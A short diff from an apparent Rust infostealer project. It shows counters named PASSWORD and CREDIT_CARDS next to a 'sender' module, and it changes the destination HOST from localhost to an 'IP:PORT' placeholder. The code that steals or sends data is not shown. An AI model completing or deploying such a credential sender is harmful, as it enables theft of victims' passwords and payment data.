@@ -27,7 +27,7 @@ mod sender;
 static mut PASSWORD: i64 = 1;
 static mut CREDIT_CARDS: i64 = 1;
 
-const HOST: &str = "127.0.0.1:12345";
+const HOST: &str = "IP:PORT";
 
 #[tokio::main]
 
